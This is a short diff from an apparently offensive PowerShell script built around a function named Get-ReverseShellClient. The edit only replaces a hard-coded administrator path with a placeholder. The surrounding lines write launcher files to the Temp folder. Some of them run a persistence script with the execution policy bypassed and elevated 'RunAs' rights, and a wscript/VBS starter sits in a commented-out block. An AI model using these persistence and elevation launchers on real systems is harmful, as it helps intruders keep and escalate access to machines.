@@ -123,13 +123,13 @@ function Get-ReverseShellClient {
 
 <#
 @'
-wscript.exe "C:\Users\ADMINI~1\AppData\Local\Temp\vbsStart.vbs" "C:\Users\ADMINI~1\AppData\Local\Temp\startPowershell.bat"
+wscript.exe "C:\Users\[NAME]\AppData\Local\Temp\vbsStart.vbs" "C:\Users\[NAME]\AppData\Local\Temp\startPowershell.bat"
 '@ | Out-File $startvbsStart -Encoding oem
 #>
 
 @'
 REM powershell -ExecutionPolicy Bypass -File Get-Persistence.ps1 -Verb RunAs"
-REM powershell.exe -Command "Start-Process cmd -ArgumentList '/k powershell C:\Users\ADMINI~1\AppData\Local\Temp\Get-Persistence.ps1' -Verb RunAs"
+REM powershell.exe -Command "Start-Process cmd -ArgumentList '/k powershell C:\Users\[NAME]\AppData\Local\Temp\Get-Persistence.ps1' -Verb RunAs"
 powershell.exe (Get-Process).Count | Out-File c:\temp\output.txt -Encoding ascii
 '@ | Out-File $startPowershell -Encoding oem
 
